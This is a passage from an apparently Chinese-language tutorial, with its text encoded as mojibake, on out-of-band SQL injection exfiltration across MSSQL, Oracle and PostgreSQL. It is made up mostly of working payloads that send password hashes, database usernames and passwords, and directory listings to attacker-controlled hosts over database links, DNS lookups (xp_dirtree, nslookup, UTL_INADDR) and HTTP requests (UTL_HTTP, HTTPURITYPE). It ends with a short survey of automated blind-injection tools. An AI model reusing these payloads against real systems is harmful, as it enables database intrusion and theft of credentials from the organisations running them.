* FROM attacker_table'</span><span class="token punctuation">)</span> <span class="token keyword">SELECT</span> name <span class="token keyword">FROM</span> sysobjects <span class="token keyword">WHERE</span> xtype<span class="token operator">=</span><span class="token string">'U'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è‹¥æ‹¥æœ‰ç®¡ç†å‘˜æƒé™å¹¶å¯åŠ¨äº†xp_cmdshell</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#ä¸‹åˆ—æŸ¥è¯¢å°†ä½¿ç›®æ ‡æ•°æ®åº“å‘é€C:\è·¯å¾„ä¸‹çš„æ–‡ä»¶å’Œç›®å½•åˆ—è¡¨ï¼š</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">OPENROWSET</span><span class="token punctuation">(</span><span class="token string">'SQLOLEDB'</span><span class="token punctuation">,</span><span class="token string">'Network=DBMSSOCN;Address=www.attacker.com:80; uid=sa; pwd=53kr3t'</span><span class="token punctuation">,</span><span class="token string">'SELECT * FROM table'</span><span class="token punctuation">)</span> <span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_cmdshell 'dir C:\'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>oracleä¹Ÿæ”¯æŒæ•°æ®åº“è¿æ¥ï¼Œä½†æ˜¯ä¸èƒ½é•¶åµŒå…¶ä»–æŸ¥è¯¢</p><p>PostgreSQL9.1æˆ–æ›´é«˜ç‰ˆæœ¬è¶…çº§ç”¨æˆ·å¯ç”¨dblinkæ‹“å±•</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> EXTENSION dblink<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åˆ©ç”¨dblinkç³»åˆ—å‘½ä»¤ä»æ”»å‡»è€…æ•°æ®åº“å‘ç”±æ”»å‡»è€…æ§åˆ¶çš„PostgreSQLæ•°æ®åº“å®ä¾‹å¤åˆ¶æ•°æ®ã€‚ä½†æ˜¯è¿™äº›å‡½æ•°ä»…å¯¹è¡Œè¿›è¡Œæ“ä½œï¼Œè€Œä¸æ˜¯å¯¹ç»“æœé›†è¿›è¡Œæ“ä½œã€‚å¦‚æœæŒ‰ç…§è¿™ç§æ–¹å¼ï¼Œè¯·å…ˆå‡†å¤‡å¥½ç¼–å†™ä¾é æ¸¸æ ‡(cursor)éå†æ•°æ®çš„PL/pgSQLå‡½æ•°ã€‚</p><p>ä¾‹å­ï¼šè½¬å‚¨äº†æ•°æ®åº“ç”¨æˆ·åŠå…¶æ•£åˆ—åçš„å¯†ç ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">FUNCTION</span> dumper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">RETURNS</span> void <span class="token keyword">AS</span> $$<span class="token keyword">DECLARE</span>rvar record<span class="token punctuation">;</span><span class="token keyword">BEGIN</span><span class="token keyword">FOR</span> rvar <span class="token operator">in</span> <span class="token keyword">SELECT</span> usename<span class="token operator">||</span><span class="token string">','</span><span class="token operator">||</span>passwd <span class="token keyword">as</span> c <span class="token keyword">FROM</span> pg_shadow <span class="token keyword">LOOP</span>PERFORM dblink_exec<span class="token punctuation">(</span><span class="token string">'host=172.16.0.100 dbname=db user=uname password=Pass'</span><span class="token punctuation">,</span><span class="token string">'insert into dumper values('''</span><span class="token operator">||</span>rvar<span class="token punctuation">.</span>c<span class="token operator">||</span><span class="token string">''')'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">END</span> <span class="token keyword">LOOP</span><span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span>$$ <span class="token keyword">LANGUAGE</span> <span class="token string">'plpgsql'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="DNSæ¸—é€"><a href="#DNSæ¸—é€" class="headerlink" title="DNSæ¸—é€"></a>DNSæ¸—é€</h4><p>ç½‘ç»œåªæœ‰å…¥å£è¿‡æ»¤è€Œæ²¡æœ‰å‡ºå£è¿‡æ»¤æ—¶ï¼Œæˆ–è€…ä»…æœ‰TCPå‡ºå£è¿‡æ»¤æ—¶ï¼Œæ•°æ®åº“å¯ç›´æ¥å‘æ”»å‡»è€…å‘é€DNSè¯·æ±‚ã€‚</p><p>PostgreSQLã€SQL serverã€Oracleå‡èƒ½ç›´æ¥æˆ–é—´æ¥å¼•å‘DNSè¯·æ±‚ï¼ŒOracleä½¿ç”¨UTL_INADDRåŒ…ï¼Œè¿™ä¸ªåŒ…åŒ…å«ä¸€ä¸ªæ˜ç¡®ç”¨äºæŸ¥æ‰¾è½¬å‘æ¡ç›®(forward entry)çš„GET_HOST_ ADDRESSå‡½æ•°å’Œä¸€ä¸ªç”¨äºæŸ¥æ‰¾é€†å‘æ¡ç›®çš„GET_HOST_NAMEå‡½æ•°ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">UTL_INADDR<span class="token punctuation">.</span>GET_HOST_ADDRESS<span class="token punctuation">(</span><span class="token string">'www.victim.com'</span><span class="token punctuation">)</span> <span class="token comment">-- è¿”å›192.168.1.0</span>UTL_INADDR<span class="token punctuation">.</span>GET_HOST_NAME<span class="token punctuation">(</span><span class="token string">'192.168.1.0'</span><span class="token punctuation">)</span><span class="token comment">-- è¿”å›www.victim.com</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>DNSå‡½æ•°ä¸éœ€è¦ä½¿ç”¨PL/SQLå—ï¼Œå¯ä»¥ç›´æ¥æ’å…¥å­æŸ¥è¯¢æˆ–è°“è¯</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#æ’å…¥è°“è¯æå–æ•°æ®åº“ç™»å½•ç”¨æˆ·</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span>UTL_INADDR<span class="token punctuation">.</span>GET_HOST_ADDRESS<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">USER</span> <span class="token keyword">FROM</span> DUAL<span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">'.attacker.com'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>PostgreSQLä½¿ç”¨XMLè§£æåº“çš„ä¸€ä¸ªå°æŠ€å·§æ¥åˆå§‹åŒ–DNSæŸ¥è¯¢</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#å°†ä¸€ä¸ªåŒ…å«æ•°æ®åº“ç”¨æˆ·åçš„æŸ¥æ‰¾å‘é€ç»™DNSæœåŠ¡å™¨ï¼Œä»¥æŸ¥æ‰¾attacker.com</span><span class="token keyword">SELECT</span> XMLPARSE<span class="token punctuation">(</span>document <span class="token string">'&lt;?xml version:"1.0" encoding="ISO-8859-1"?&gt;&lt;!DOCTYPE x [ &lt;!ELEMENT x ANY &gt;&lt;!ENTITY xx SYSTEM "http://'</span><span class="token operator">||</span><span class="token keyword">user</span><span class="token operator">||</span>'attacker<span class="token punctuation">.</span>com<span class="token punctuation">.</span><span class="token operator">/</span>"<span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>x<span class="token operator">&gt;</span><span class="token operator">&amp;</span>xx<span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>x<span class="token operator">&gt;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>åªè¦PostgreSQLå®‰è£…äº†dblink,åœ¨è¿æ¥å­—ç¬¦ä¸²ä¸­å°±å¯ä»¥æŒ‡å®šä¸€ä¸ªä¸»æœºå(hostname)ä»¥å¼•å‘ä¸€æ¬¡DNSæŸ¥æ‰¾ï¼Œä½†è¿™è¦æ±‚å…·æœ‰è¶…çº§ç”¨æˆ·çš„è®¿é—®æƒé™ã€‚</p><p>mssqlå¯ä»¥é€šè¿‡xp_cmdshellå­˜å‚¨è¿‡ç¨‹æ¥æ‰§è¡Œnslookupå‘½ä»¤</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_cmdshell <span class="token string">'nslookup www.victim'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœæ”»å‡»è€…çš„DNSæœåŠ¡å™¨æ˜¯å…¬å…±å¯ç”¨çš„192.168.1.1ï¼Œé‚£ä¹ˆç›´æ¥æŸ¥æ‰¾DNSè¯·æ±‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_cmdshell <span class="token string">'nslookup www.victim 192.168.1.1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯ä»¥å°†è¿™äº›ä»£ç ç»‘å®šåˆ°ä¸€äº›shellè„šæœ¬ä¸­ä»¥æå–ç›®å½•å†…å®¹</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">EXEC master<span class="token punctuation">..</span>xp_cmdshell <span class="token string">'for /F "tokens=5"%i in ('</span>'dir c:<span class="token punctuation">\</span>'<span class="token string">') do nslookup %i.attacker.com'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™æ˜¯æ•°æ®åº“æ‰€åœ¨æœºå™¨çš„é»˜è®¤æœç´¢åŸŸã€‚å¯ä»¥ä¸ºä¼ é€’ç»™nslookupçš„åç§°æ·»åŠ ä¸€ä¸ªç‚¹å·(.)ï¼Œä»è€Œé˜»æ­¢åœ¨é»˜è®¤åŸŸä¸­è¿›è¡ŒæŸ¥æ‰¾ã€‚</p><p>å…¶ä»–å‚¨å­˜è¿‡ç¨‹,è¿™äº›å­˜å‚¨è¿‡ç¨‹ä¾èµ–äºWindowså¯¹ç½‘ç»œ</p><p>UNC(Universal Naming Convention,é€šç”¨å‘½åçº¦å®š)è·¯å¾„çš„å†…åœ¨æ”¯æŒ</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">xp_getfiledetails<span class="token punctuation">(</span><span class="token keyword">SQL</span> Server <span class="token number">2000</span><span class="token punctuation">,</span>éœ€è¦ä¸€ä¸ªæ–‡ä»¶è·¯å¾„<span class="token punctuation">)</span>xp_fileexist<span class="token punctuation">(</span><span class="token keyword">SQL</span> Server <span class="token number">2000</span><span class="token punctuation">,</span> <span class="token number">2005</span>ã€<span class="token number">2008</span> å’Œ <span class="token number">2008</span> R2<span class="token punctuation">,</span>éœ€è¦ä¸€ä¸ªæ–‡ä»¶è·¯å¾„<span class="token punctuation">)</span>xp_dirtree<span class="token punctuation">(</span><span class="token keyword">SQL</span> Server <span class="token number">2000.</span> <span class="token number">2005</span>ã€<span class="token number">2008</span> å’Œ <span class="token number">2008</span> R2<span class="token punctuation">,</span>éœ€è¦ä¸€ä¸ªæ–‡ä»¶è·¯å¾„<span class="token punctuation">)</span> <span class="token keyword">DECLARE</span> <span class="token variable">@a</span> <span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">SET</span> <span class="token variable">@a</span><span class="token operator">=</span><span class="token string">'\\'</span><span class="token operator">+</span><span class="token keyword">SYSTEM_USER</span><span class="token operator">+</span><span class="token string">'.attacker.com.'</span><span class="token punctuation">;</span> <span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_dirtree <span class="token variable">@a</span><span class="token comment">#å­˜å‚¨è¿‡ç¨‹çš„å‚æ•°åˆ—è¡¨ç¦æ­¢ä½¿ç”¨å­—ç¬¦ä¸²è¿æ¥ï¼Œå› è€Œä¸Šè¿°ä»£ç ä½¿ç”¨äº†ä¸€ä¸ªä¸­é—´å˜é‡æ¥ä¿å­˜è·¯å¾„ã€‚SQLé—´æ¥å¼•å‘äº†å¯¹ä¸»æœºåsa.attacker.comçš„DNSæŸ¥æ‰¾ï¼Œæœ€ç»ˆè¯æ˜äº†æ˜¯åœ¨ä½¿ç”¨ç®¡ç†å‘˜è´¦æˆ·è¿›è¡Œç™»å½•ã€‚</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€šè¿‡xp_cmdshellæ‰§è¡ŒDNSæŸ¥æ‰¾æ—¶ï¼Œè·¯å¾„ä¸­å‡ºç°éæ³•å­—ç¬¦ä¼šå¯¼è‡´æ¡©è§£æå™¨ (resolver stub)å¤±è´¥ï¼Œä»è€Œæ— æ³•å°è¯•æŸ¥æ‰¾ã€‚åŒæ ·ï¼ŒUNCè·¯å¾„å¤šäº128ä¸ªå­—ç¬¦ä¹Ÿä¼šå¯¼è‡´æ¡©è§£æå™¨å¤±è´¥ã€‚å¯ä»¥å…ˆå°†å¸Œæœ›æ£€ç´¢çš„æ•°æ®è½¬æ¢æˆå®Œå…¨èƒ½å¤Ÿè¢«DNSå¤„ç†çš„æ ¼å¼ï¼Œä¸€ç§åšæ³•æ˜¯å°†æ•°æ®è½¬æ¢æˆåå…­è¿›åˆ¶è¡¨ç¤ºã€‚SQL ServeråŒ…å«ä¸€ä¸ªåä¸ºFN_VARBINTOHEXSTR() çš„å‡½æ•°ï¼Œå®ƒæ¥æ”¶ç±»å‹ä¸ºVARBINARYçš„å‚æ•°å¹¶è¿”å›è¯¥æ•°æ®çš„åå…­è¿›åˆ¶è¡¨ç¤ºã€‚ä¾‹å¦‚ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>fn_varbintohexstr<span class="token punctuation">(</span>CAST<span class="token punctuation">(</span><span class="token keyword">SYSTEM_USER</span> <span class="token keyword">as</span> <span class="token keyword">VARBINARY</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">-- 0x73006100</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>é•¿åº¦é—®é¢˜ï¼Œsubstring()</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DECLARE</span> <span class="token variable">@a</span> <span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token variable">@a</span><span class="token operator">=</span><span class="token string">'\\'</span><span class="token operator">+</span>master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>fn_varbintohexstr<span class="token punctuation">(</span>CAST<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">TOP</span> <span class="token number">1</span> CAST<span class="token punctuation">(</span>review_body <span class="token keyword">AS</span> <span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token keyword">VARBINARY</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'.attacker.com.'</span><span class="token punctuation">;</span><span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_dirtree <span class="token variable">@a</span><span class="token punctuation">;</span><span class="token comment">-- "0x4d6f7669657320696e20746869732067656e7265206f667465.attacker.com." æˆ– "Movies in this genre ofte"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¤šè¡Œæ“ä½œéœ€è¦å°è£…</p><h4 id="e-mailæ¸—é€"><a href="#e-mailæ¸—é€" class="headerlink" title="e-mailæ¸—é€"></a>e-mailæ¸—é€</h4><p>è·ŸDNSç±»ä¼¼ï¼Œä½¿ç”¨SMTPï¼ˆSimple Mail Transfer Protocol,ç®€å•é‚®ä»¶ä¼ è¾“åè®®ï¼‰å‘é€e-mailä¸éœ€è¦ç›´æ¥è¿æ¥å‘é€è€…å’Œæ¥æ”¶è€…ã€‚è¯¥æ–¹æ³•çš„é™åˆ¶åœ¨äºå¼‚æ­¥æ€§ä¸Šã€‚å‘é€åˆ©ç”¨ä¹‹åï¼Œe-mailéœ€è¦è¿‡ä¸€æ®µæ—¶é—´æ‰èƒ½åˆ°è¾¾ã€‚</p><h4 id="HTTPæ¸—é€"><a href="#HTTPæ¸—é€" class="headerlink" title="HTTPæ¸—é€"></a>HTTPæ¸—é€</h4><p>é€‚ç”¨åœºåˆæ˜¯ï¼šæ•°æ®åº“æœåŠ¡å™¨æ‹¥æœ‰ç½‘ç»œå±‚è®¸å¯æ¥è®¿é—®ç”±æ”»å‡»è€…æ§åˆ¶çš„Webèµ„æºã€‚SQL Serverå’ŒMySQLæ²¡æœ‰åŒ…å«æ„é€ HTTPè¯·æ±‚çš„é»˜è®¤æœºåˆ¶ï¼Œä½¿ç”¨è‡ªå®šä¹‰æ‰©å±•å®ç°ï¼ŒPostgreSQLå¯ä»¥ä½¿ç”¨å¤–éƒ¨è¯­è¨€å°è£…æˆHTTPçš„å‡½æ•°ï¼ŒOracleç”±UTL_HTTPå’ŒHTTPURITYPEåŒ…æä¾›ï¼Œpublicæƒé™ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span>review_author<span class="token operator">=</span>UTL_HTTP<span class="token punctuation">.</span>REQUEST<span class="token punctuation">(</span><span class="token string">'www.attacker.com/'</span><span class="token operator">||</span><span class="token keyword">USER</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å¤æŸ¥webæ—¥å¿—ä¼šå‘ç°ä¸€æ¡åŒ…å«æ•°æ®åº“ç™»å½•çš„æ—¥å¿—</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#Oracle llgï¼š</span><span class="token string">'a'</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>UTL_HTTP<span class="token punctuation">.</span>REQUEST<span class="token punctuation">(</span><span class="token string">'www.attacker.com/'</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> sys<span class="token punctuation">.</span>stragg<span class="token punctuation">(</span><span class="token keyword">DISTINCT</span> username<span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">61</span><span class="token punctuation">)</span><span class="token operator">||</span>password<span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> dba_users<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span>'a<span class="token comment">-- å°†æ‰€æœ‰ç”¨æˆ·åå’Œå£ä»¤å‘é€ç»™äº†æ”»å‡»è€…çš„è®¿é—®æ—¥å¿—</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#Oracle 9z R2å’Œæ›´é«˜ç‰ˆæœ¬çš„+XMLBï¼š</span><span class="token string">'a'</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>UTL_HTTP<span class="token punctuation">.</span>REQUEST<span class="token punctuation">(</span><span class="token string">'attacker.com/'</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> xmltransform<span class="token punctuation">(</span>sys_xmlagg<span class="token punctuation">(</span>sys_xmlgen<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>xmltype<span class="token punctuation">(</span><span class="token string">'&lt;?xml version="l.0"?&gt; &lt;xsl:stylesheet version="1.0" xmlns:xs1="http://www.w3.org/1999/XSL/Transform"&gt;&lt;xsl:template match="/"&gt;&lt;xsl:for-each select="/ROWSET/ USERNAME"&gt;&lt;xsl:value-of select="text()"/&gt;;&lt;/xsl:for-each&gt;&lt;/xsl:templatex/xsl:stylesheet&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getstringval<span class="token punctuation">(</span><span class="token punctuation">)</span> listagg <span class="token keyword">from</span> all_users<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span>'a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#HTTPURITYPE</span><span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>LENGTH<span class="token punctuation">(</span>HTTPURITYPE<span class="token punctuation">(</span><span class="token string">'http://attacker/'</span><span class="token operator">||</span>username<span class="token operator">||</span><span class="token string">'='</span><span class="token operator">||</span>password<span class="token punctuation">)</span><span class="token punctuation">.</span>getclob <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span><span class="token keyword">user</span>$ <span class="token keyword">WHERE</span> <span class="token keyword">type</span><span class="token comment">#=0 AND LENGTH(password)=16)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>WebæœåŠ¡å™¨çš„è®¿é—®æ—¥å¿—æ–‡ä»¶å°†åŒ…å«æ•°æ®åº“çš„æ‰€æœ‰ç”¨æˆ·åå’Œå£ä»¤ã€‚</p><p>æ³¨å…¥ORDER BYå­å¥</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> banner <span class="token keyword">FROM</span> v$version <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> LENGTH<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> dba_users <span class="token keyword">WHERE</span> UTL_HTTP<span class="token punctuation">.</span>REQUEST<span class="token punctuation">(</span><span class="token string">'www.attacker.com/'</span><span class="token operator">||</span>username<span class="token operator">||</span><span class="token string">'='</span><span class="token operator">||</span>password<span class="token punctuation">)</span> <span class="token operator">IS</span> <span class="token operator">NOT</span> <span class="token boolean">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ICMPæ¸—é€"><a href="#ICMPæ¸—é€" class="headerlink" title="ICMPæ¸—é€"></a>ICMPæ¸—é€</h4><h3 id="è‡ªåŠ¨SQLç›²æ³¨åˆ©ç”¨"><a href="#è‡ªåŠ¨SQLç›²æ³¨åˆ©ç”¨" class="headerlink" title="è‡ªåŠ¨SQLç›²æ³¨åˆ©ç”¨"></a>è‡ªåŠ¨SQLç›²æ³¨åˆ©ç”¨</h3><h4 id="Absinthe"><a href="#Absinthe" class="headerlink" title="Absinthe"></a>Absinthe</h4><p>Absintheçš„å¨åŠ›åœ¨äºæ”¯æŒæ•°æ®åº“æ˜ å°„ï¼Œå¹¶ä¸”èƒ½åˆ©ç”¨åŸºäºé”™è¯¯å’Œå“åº”çš„æ¨æ–­åˆ©ç”¨æ¥å¯¹å¾ˆå¤šæµè¡Œçš„æ•°æ®åº“ï¼ˆä¸ç®¡æ˜¯å•†ä¸šçš„è¿˜æ˜¯å¼€æºçš„ï¼‰è¿›è¡Œæ£€ç´¢ã€‚æ–¹ä¾¿çš„GUIä¸ºæ”»å‡»è€…å¸¦æ¥äº†å¾ˆå¥½çš„ä½“éªŒï¼Œä½†ç¼ºå°‘ç‰¹å¾ç­¾åæ”¯æŒé™åˆ¶äº†å…¶æ•ˆèƒ½ã€‚</p><h4 id="BSQL-Hacker"><a href="#BSQL-Hacker" class="headerlink" title="BSQL Hacker"></a>BSQL Hacker</h4><p>BSQL Hackeræ˜¯å¦ä¸€æ¬¾å›¾å½¢åŒ–å·¥å…·ï¼Œå®ƒä½¿ç”¨åŸºäºæ—¶é—´åŠå“åº”çš„æ¨æ–­æŠ€æœ¯å’Œæ ‡å‡†é”™è¯¯æ¥ä»æ‰€æé—®çš„æ•°æ®åº“ä¸­æå–æ•°æ®ã€‚è™½ç„¶å®ƒä»å¤„äºæµ‹è¯•é˜¶æ®µï¼Œä¸æ˜¯å¾ˆç¨³å®šï¼Œä½†è¯¥å·¥å…·å‰æ™¯å¾ˆå¥½ä¸”æä¾›äº†å¾ˆå¤šæ¬ºè¯ˆæœºä¼šã€‚</p><p><a href="https://labs.portcullis.co.uk/apologies-page-not-found/#aHR0cHM6Ly9sYWJzLnBvcnRjdWxsaXMuY28udWsvYXBwbGljYXRpb24vYnNhbC1oYWNrZXI=">Apologies, page not found | Portcullis Labs</a></p><h4 id="SQLBrute"><a href="#SQLBrute" class="headerlink" title="SQLBrute"></a>SQLBrute</h4><p>SQLBruteæ˜¯ä¸€æ¬¾å‘½ä»¤è¡Œå·¥å…·ï¼Œå®ƒé’ˆå¯¹å¸Œæœ›ä½¿ç”¨åŸºäºæ—¶é—´æˆ–å“åº”çš„æ¨æ–­æ¥åˆ©ç”¨æŸä¸ªå›ºå®šæ¼æ´çš„ç”¨æˆ·ã€‚</p><h4 id="Sqlmap-1"><a href="#Sqlmap-1" class="headerlink" title="Sqlmap"></a>Sqlmap</h4><p>Sqlmapå°†æ¼æ´çš„å‘ç°å’Œåˆ©ç”¨ç»“åˆåœ¨ä¸€æ¬¾å¼ºå¤§çš„å·¥å…·ä¸­ï¼Œå®ƒæ—¢æ”¯æŒåŸºäºæ—¶é—´çš„æ¨æ–­æ–¹æ³•ï¼Œä¹Ÿæ”¯æŒåŸºäºå“åº”çš„æ¨æ–­æ–¹æ³•ï¼Œå¦å¤–è¿˜æ”¯æŒICMPé€šé“æ–¹æ³•ã€‚è¯¥å·¥å…·çš„æˆé•¿é€Ÿåº¦å¾ˆå¿«ï¼Œå¼€å‘ä¹Ÿå¾ˆæ´»è·ƒã€‚</p><h4 id="Sqlninja"><a href="#Sqlninja" class="headerlink" title="Sqlninja"></a>Sqlninja</h4><p>Sqlninjaæœ‰å¾ˆå¤šç‰¹æ€§ï¼Œå®ƒæ”¯æŒä½¿ç”¨åŸºäºDNSçš„éä¸»æµé€šé“æ¥æ‰§è¡Œè¿œç¨‹å‘½ä»¤ã€‚é¦–å…ˆä¸Šä¼ ä¸€ä¸ªè‡ªå®šä¹‰çš„äºŒè¿›åˆ¶å°è£…å™¨ï¼ˆwrapperï¼‰ï¼Œç„¶åé€šè¿‡ä¸Šä¼ çš„å°è£…å™¨æ¥æ‰§è¡Œå‘½ä»¤ã€‚å°è£…å™¨æ•è·æ‰€æœ‰æ¥è‡ªå‘½ä»¤çš„è¾“å‡ºå¹¶åˆå§‹åŒ–ä¸€ä¸ªDNSè¯·æ±‚åºåˆ—ï¼Œè¯·æ±‚ä¸­åŒ…å«äº†ç¼–ç åçš„è¾“å‡ºã€‚</p><h4 id="Squeeza"><a href="#Squeeza" class="headerlink" title="Squeeza"></a>Squeeza</h4><p>Squeezaåˆ™ä»å¦ä¸€ä¸ªè§†è§’å®¡è§†SQLæ³¨å…¥ï¼Œå®ƒå°†æ•°æ®åˆ›å»ºä¸æ•°æ®æå–åŒºåˆ†å¼€æ¥ã€‚è¯¥å‘½ä»¤è¡Œå·¥å…·å¯ä½¿ç”¨åŸºäºæ—¶é—´çš„æ¨æ–­ã€æ ‡å‡†é”™è¯¯æˆ–DNSæ¥æå–æ—¶é—´ã€‚DNSé€šé“å®Œå…¨å€ŸåŠ©T-SQLæ¥æ‰§è¡Œï¼Œå› è€Œä¸éœ€è¦ä¸Šä¼ äºŒè¿›åˆ¶å°è£…å™¨ã€‚</p><h2 id="åˆ©ç”¨æ“ä½œç³»ç»Ÿ"><a href="#åˆ©ç”¨æ“ä½œç³»ç»Ÿ" class="headerlink" title="åˆ©ç”¨æ“ä½œç³»ç»Ÿ"></a>åˆ©ç”¨æ“ä½œç³»ç»Ÿ</h2><p>è®¿é—®æ–‡ä»¶ç³»ç»Ÿä»¥æ‰§è¡Œæœ‰æ•ˆçš„ä»»åŠ¡ï¼ˆæ¯”å¦‚è¯»å–æ•°æ®å’Œä¸Šä¼ æ–‡ä»¶ï¼‰</p><h3 id="è®¿é—®æ–‡ä»¶ç³»ç»Ÿ"><a href="#è®¿é—®æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="è®¿é—®æ–‡ä»¶ç³»ç»Ÿ"></a>è®¿é—®æ–‡ä»¶ç³»ç»Ÿ</h3><h4 id="è¯»æ–‡ä»¶"><a href="#è¯»æ–‡ä»¶" class="headerlink" title="è¯»æ–‡ä»¶"></a>è¯»æ–‡ä»¶</h4><p>æ”»å‡»è€…å¸Œæœ›èƒ½å¤Ÿè¯»å–ASCIIæ–‡æœ¬å’ŒäºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p><h5 id="MySQL"><a href="#MySQL" class="headerlink" 